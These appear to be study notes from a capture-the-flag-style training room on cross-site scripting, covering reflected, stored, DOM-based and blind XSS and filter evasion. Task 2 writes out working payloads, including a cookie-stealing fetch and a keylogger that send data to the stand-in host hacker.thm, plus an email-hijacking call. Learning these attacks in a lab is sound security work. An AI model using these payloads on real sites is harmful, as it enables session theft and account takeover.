# Cross-Site Scripting
### Task 1 Room Brief
XSS is based on JavaScript, so a basic level of JS is required. A basic understanding of Client-Server requests is also required.

XSS is classified as an injection attack where malicious JS gets injected into a web application with the intention of being executed by other users. In this room, it will cover the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can test out skills.

### Task 2 XSS Payloads
In XSS, the payload is the JS code we wish to be executed on the target's computer. There are two parts to the payload, the intention and the modification.

The intention is what you wish the JS to actually do, and the modification is the changes to the code we need to make it execute as every scenario is different.

##### Proof Of Concept
The simpliest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on a page with a string of text

`<script>alert('xss vulnerable');</script>`

##### Session Stealing
Details of a user's session, such as login tokens, are often kept in cookies on the target's machine. The below JS takes the target's cookie, base64 encodes and then posts it to the website under the hacker's control to be logged.

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`

##### Key Logger
This will capture anything typed on the webpage and forward it to a website under the hacker's control. This could be very damaging if the website payload was installed on accepted user logins or credit card details

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

##### Business Logic
This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JS function. For example, imagine a JS function for changing the user's email address called `user.changeEmail()`. The payload:

`<script>user.changeEmail('attacker@hacker.thm');</script>`

### Task 3 Reflected XSS
Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

##### Potential Impact
The attacker could send links or embed them into an iframe on another website containing a JS payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information

##### How to test for Reflected XSS
- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

### Task 4 Stored XSS
As the named infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

Example: A blog that allows for comments to be posted, but if you post a comment with script tags in them, it will be stored in their database and executed everytime someone visits the article.

##### Potential Impact
The malicious JS could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

##### How to test for Stored XSS
- Comments on a blog
- User profile information
- Website Listings

### Task 5 DOM Based XSS
DOM is Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.

![[Pasted image 20220205085049.png]]

##### Exploiting the DOM
DOM Based XSS is where the JS execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JS code acts on input or user interaction.

Example: The website's JS gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JS of their choosing onto the webpage.

##### Potential Impact
Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or user's session

##### How to test for DOM based XSS
DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JS to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "**window.location.x**" parameters.

When you've found those bits, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JS methods such as **eval()**

### Task 6 Blind XSS
Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

Example: A website has a contact form where you can message a member of staff. The message doesn't get checked for any malicious code, which allows the attacker to enter anything they wish These messages then get turned into support tickets which staff view on a private web portal.

##### How to test for Blind XSS
When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is `xsshunter`. Although it's possible to makeyour own tool in JS, this tool will automatically capture cookies, URLs, page contents and more.

### Task 7 Perfecting your payload
Level 1: Is vulnerable to the initial POC, alert('THM')

Level 2: There's an input tag, can use `">` to break out of the input tag and then do the normal script tag.

Level 3: Now the output is in a textarea tag. We can close the textarea tag and then do the normal script tag

### Task 8 Practical Example (Blind XSS)
